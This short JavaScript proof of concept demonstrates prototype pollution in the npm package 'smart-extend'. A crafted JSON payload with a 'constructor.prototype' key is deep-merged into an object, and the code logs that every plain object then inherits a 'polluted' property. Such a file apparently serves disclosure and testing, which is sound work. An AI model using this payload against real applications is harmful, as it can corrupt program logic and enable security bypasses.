var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var extend = require('smart-extend');
obj = {};
console.log({}.polluted);
var payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
extend.deep(obj, JSON.parse(payload));
console.log({}.polluted);